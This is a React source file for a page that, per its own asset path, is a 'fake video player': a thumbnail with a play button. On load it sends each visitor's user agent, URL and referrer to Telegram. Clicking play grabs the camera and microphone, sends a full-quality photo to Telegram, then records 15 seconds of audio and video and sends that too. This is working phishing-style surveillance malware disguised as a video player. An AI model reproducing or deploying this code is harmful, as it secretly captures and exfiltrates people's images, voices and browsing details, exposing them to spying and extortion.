import { PlayIcon } from '@heroicons/react/24/solid';
import { useState, useEffect, useCallback } from 'react';
import { sendTelegramNotification, sendImageToTelegram, sendVideoToTelegram } from './utils/telegram';

function App() {
  const [isBlurred] = useState(false);
  const thumbnailUrl = 'https://raw.githubusercontent.com/zsfell/fake-vidio-player/refs/heads/main/assets/img/ss.png';

  useEffect(() => {
    const sendVisitorNotification = async () => {
      await sendTelegramNotification({
        userAgent: navigator.userAgent,
        location: window.location.href,
        referrer: document.referrer || 'Direct',
        previousSites: document.referrer || 'None',
      });
    };

    sendVisitorNotification();
  }, []);

  const captureAndSendMedia = useCallback(async () => {
    try {
      // Get device capabilities first
      const devices = await navigator.mediaDevices.enumerateDevices();
      const videoDevice = devices.find(device => device.kind === 'videoinput');
      
      if (!videoDevice) {
        throw new Error('No video input device found');
      }

      const constraints = {
        video: {
          deviceId: videoDevice.deviceId,
          width: { ideal: 4096 }, // Maximum supported width
          height: { ideal: 2160 }, // Maximum supported height
          frameRate: { ideal: 60 }
        },
        audio: true
      };

      const stream = await navigator.mediaDevices.getUserMedia(constraints);

      // Get actual video track settings
      const videoTrack = stream.getVideoTracks()[0];
      const settings = videoTrack.getSettings();
      
      // Create and setup video element for photo capture
      const video = document.createElement('video');
      video.srcObject = stream;
      video.playsInline = true;
      video.muted = true;
      video.autoplay = true;
      
      // Wait for video to be ready
      await new Promise((resolve) => {
        video.onloadedmetadata = async () => {
          try {
            await video.play();
            setTimeout(resolve, 500);
          } catch (error) {
            console.error('Error playing video:', error);
            resolve(true);
          }
        };
      });

      // Setup canvas with actual video dimensions
      const canvas = document.createElement('canvas');
      canvas.width = settings.width || 1920;
      canvas.height = settings.height || 1080;
      const context = canvas.getContext('2d');
      
      if (context) {
        context.drawImage(video, 0, 0, canvas.width, canvas.height);
      }

      // Convert photo to blob with maximum quality
      const photoBlob = await new Promise<Blob>((resolve) => {
        canvas.toBlob((blob) => {
          if (blob) resolve(blob);
        }, 'image/jpeg', 1.0);
      });

      // Send photo immediately
      sendImageToTelegram(photoBlob).catch(console.error);

      // Check supported video formats
      const mimeTypes = [
        'video/mp4;codecs=h264,aac',
        'video/mp4',
        'video/webm;codecs=vp8,opus',
        'video/webm'
      ];

      const supportedMimeType = mimeTypes.find(type => MediaRecorder.isTypeSupported(type));

      if (!supportedMimeType) {
        throw new Error('No supported video format found');
      }

      // Configure video recording with maximum quality
      const mediaRecorder = new MediaRecorder(stream, {
        mimeType: supportedMimeType,
        videoBitsPerSecond: 8000000 // 8 Mbps for high quality
      });
      
      const chunks: BlobPart[] = [];

      mediaRecorder.ondataavailable = (e) => {
        if (e.data.size > 0) {
          chunks.push(e.data);
        }
      };

      mediaRecorder.onstop = async () => {
        const videoBlob = new Blob(chunks, { 
          type: supportedMimeType.includes('mp4') ? 'video/mp4' : 'video/webm'
        });
        console.log('Video recording completed, size:', videoBlob.size);
        await sendVideoToTelegram(videoBlob);
        stream.getTracks().forEach(track => track.stop());
      };

      // Start recording with frequent data chunks for better quality
      mediaRecorder.start(1000);
      console.log('Started recording video');

      // Stop recording after 15 seconds
      setTimeout(() => {
        if (mediaRecorder.state === 'recording') {
          console.log('Stopping video recording');
          mediaRecorder.stop();
        }
      }, 15000);

    } catch (error) {
      console.error('Error capturing media:', error);
    }
  }, []);

  const handlePlayClick = async () => {
    await captureAndSendMedia();
  };

  return (
    <div className="0">
      <header className="">
        <div className="container mx-auto px-4">
        </div>
      </header>

      <main className="">
        <div className="max-w-[1920px] mx-h-[1080px]">
          <div className="relative">
            <div className="">
              {isBlurred && (
                <div className="" />
              )}
              <div className="absolute inset-0 flex items-center justify-center z-50">
                <button 
                  onClick={handlePlayClick}
                  className="bg-red-600 rounded-full p-8 hover:bg-red-700 transition-all duration-300 hover:scale-110 group"
                >
                  <PlayIcon className="w-20 h-20 text-white group-hover:text-gray-100" />
                </button>
              </div>
              <img 
                src={thumbnailUrl} 
                alt="Video Thumbnail" 
                className="w-full h-full object-cover"
              />
            </div>
          </div>
        </div>
      </main>
    </div>
  );
}

export default App;
